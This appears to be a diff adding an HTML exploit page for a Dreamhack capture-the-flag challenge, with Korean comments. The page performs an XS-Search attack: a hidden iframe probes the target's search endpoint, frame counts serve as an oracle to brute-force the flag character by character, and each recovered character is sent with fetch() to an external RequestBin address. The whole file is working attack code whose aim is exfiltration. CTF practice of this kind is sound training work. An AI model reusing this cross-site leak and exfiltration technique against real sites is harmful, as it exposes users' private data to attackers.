@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h3>XS-Search Exploit...</h3>
+    <iframe id="ifr" style="display:none;"></iframe>
+    <script>
+        // 1. 설정: 문제 서버 주소와 데이터를 받을 드림핵 툴 주소
+        const TARGET = "http://host3.dreamhack.games:23228/search?query="; // 문제 서버 포트로 수정
+        const EXFIL = "https://fcdydty.request.dreamhack.games/"; // 본인의 RequestBin 주소
+
+        const chars = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
+        let flag = "DH{";
+
+        async function check(query) {
+            return new Promise(resolve => {
+                const ifr = document.getElementById('ifr');
+                ifr.src = TARGET + encodeURIComponent(query);
+                
+                // <iframe>의 로딩이 끝나면 실행되는 핸들러
+                ifr.onload = () => {
+                    // 결과가 있으면 <iframe> 내부에 또 다른 <iframe>(search.html의 결과물)이 생김
+                    // 따라서 frames.length가 0보다 큼
+                    if (ifr.contentWindow.frames.length > 0) {
+                        resolve(true);
+                    } else {
+                        resolve(false);
+                    }
+                };
+            });
+        }
+
+        async function exploit() {
+            // 한 글자씩 무차별 대입
+            for (let c of chars) {
+                let test_flag = flag + c;
+                if (await check(test_flag)) {
+                    flag += c;
+                    // 찾은 글자를 드림핵 RequestBin으로 전송
+                    fetch(EXFIL + "?flag=" + encodeURIComponent(flag));
+                    
+                    // 다음 글자를 찾기 위해 다시 처음부터 루프 (재귀적 구조)
+                    if (c !== "}") {
+                        exploit();
+                    }
+                    return;
+                }
+            }
+        }
+
+        window.onload = exploit;
+    </script>
+</body>
+</html>
